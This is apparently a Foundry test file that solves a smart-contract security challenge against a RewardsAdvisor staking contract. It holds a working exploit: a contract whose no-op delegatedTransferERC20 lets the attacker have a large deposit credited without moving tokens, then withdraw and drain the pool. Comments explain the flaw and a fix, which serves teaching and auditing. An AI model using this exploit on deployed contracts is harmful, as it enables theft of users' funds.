// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {Token} from "src/other/Token.sol";
import {GovToken} from "src/freebie/GovToken.sol";
import {RewardsAdvisor} from "src/freebie/RewardsAdvisor.sol";

contract Testing is Test {
    address attacker = makeAddr("attacker");
    address o1 = makeAddr("o1");
    address o2 = makeAddr("o2");
    address admin = makeAddr("admin"); // should not be used
    address adminUser = makeAddr("adminUser"); // should not be used

    Token farm;
    GovToken govToken;
    RewardsAdvisor rewardsAdvisor;

    /// preliminary state
    function setUp() public {
        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying token contract
        vm.prank(admin);
        farm = new Token("FARM", "FARM");

        address[] memory addresses = new address[](2);
        uint256[] memory amounts = new uint256[](2);

        addresses[0] = adminUser;
        addresses[1] = attacker; // attacker gets 1
        amounts[0] = 10_000e18;
        amounts[1] = 1e18;
        vm.prank(admin);
        farm.mintPerUser(addresses, amounts);

        // deploying core contracts
        vm.prank(admin);
        govToken = new GovToken("xFARM", "xFARM");

        vm.prank(admin);
        rewardsAdvisor = new RewardsAdvisor(address(farm), address(govToken));

        vm.prank(admin);
        govToken.transferOwnership(address(rewardsAdvisor));

        // --other user stakes their FARM tokens
        vm.prank(adminUser);
        farm.approve(address(rewardsAdvisor), type(uint256).max);
        vm.prank(adminUser);
        rewardsAdvisor.deposit(10_000e18, payable(adminUser), adminUser);
    }

    /// solves the challenge
    function testChallengeExploit7() public {
        vm.startPrank(attacker, attacker);

        Exploit exploit = new Exploit(attacker);
        rewardsAdvisor.deposit(10_000e25, payable(address(exploit)), attacker);
        rewardsAdvisor.withdraw(10_000e25, attacker, payable(attacker));

        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {
        // attacker drains 99.99%+ of the `FARM` tokens from RewardsAdvisor staking contract
        assertGe(farm.balanceOf(attacker), 10_000e18);
        assertLe(farm.balanceOf(address(rewardsAdvisor)), 1e18);
    }
}

contract Exploit {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function delegatedTransferERC20(address, address, uint256) public {
        return;
    }
}

// the vulnerability was allowing call to random contract in deposit function if from address is a contract.
// as a result , one could create a contract, that would not transfer erc20 tokens on delegatedTransferERC20
// but RewardsAdvisor would consider tokens transfered

// Recommendation: check farm tokens balance before and after transfer , and take difference as a number of xfarm tokens to mint
